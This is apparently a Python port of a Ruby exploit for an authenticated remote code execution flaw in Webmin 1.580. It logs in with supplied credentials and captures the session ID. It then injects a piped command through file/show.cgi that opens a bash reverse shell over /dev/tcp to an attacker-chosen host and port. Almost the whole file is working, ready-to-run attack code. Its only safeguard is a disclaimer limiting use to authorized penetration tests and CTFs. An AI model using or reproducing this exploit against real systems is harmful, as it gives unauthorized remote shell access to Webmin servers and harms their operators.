#!/usr/bin/env python

# Converting a RCE (Remote Code Execution) exploit in Webmin 1.580 written in Ruby into Python.
# Usage: python3 webmin-rce.py <Target IP>:<Port>
# I will not be responsible for any damage done by this exploit. This should be used for authorized Pen-Tests or CTFs only!
# Do not forget to change 'lhost', 'lport' and user credentials. 

import requests, string, secrets, sys

target = sys.argv[1]
lhost = "10.10.10.10" 
lport = "4444"  

data = {'page' : "%2F", 'user' : "<username>", 'pass' : "<password>"}
url = f"http://{target}/session_login.cgi"

# Checking if the target is vulnerable

r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)

if r.status_code == 302 and r.cookies["sid"] != None:
	print("[+] Login sucessful, executing payload!")
else:
	print("[-] Login Failed!")

sid = r.cookies["sid"]
print("[*] Session ID = " + sid)
print("[*] Sending Reverse Shell to " + lhost + ":" + lport)


# Function generating a random alpha numeric character

def random():
	chars = string.ascii_letters + string.digits
	randchar = ''.join(secrets.choice(chars) for i in range(5))
	return randchar

# Exploit


def payload():
	payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"
	return payload

exp = f"http://{target}/file/show.cgi/bin/{random()}|{payload()}|"

req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)








	
	








